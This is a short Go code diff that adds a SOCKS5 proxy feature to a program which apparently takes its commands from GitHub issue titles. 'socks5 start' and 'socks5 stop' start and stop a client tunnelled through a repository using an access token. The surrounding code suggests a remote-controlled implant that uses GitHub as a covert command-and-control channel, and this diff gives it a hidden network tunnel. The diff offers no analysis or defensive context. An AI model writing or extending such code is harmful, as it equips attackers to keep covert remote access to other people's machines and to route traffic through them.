@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"darknight/github/socks5"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -401,6 +402,20 @@ func main() {
 					fmt.Println(fmt.Errorf("Failed to post comment: %v", err))
 				}
 			}
+		}
+
+		if title != "" && strings.HasPrefix(title, "socks5") {
+			args := strings.Fields(title)
+			socks5Client := socks5.NewGithubSocks5(owner, repo, token, "")
+			if args[1] == "start" {
+				//启动socks5客户端
+				go socks5Client.StartClient()
+			} else if args[1] == "stop" {
+				os.Exit(0)
+			} else {
+				fmt.Println(fmt.Sprintf("error command: %s", title))
+			}
+
 		}
 
 		if title != "" && strings.HasPrefix(title, "exit") {
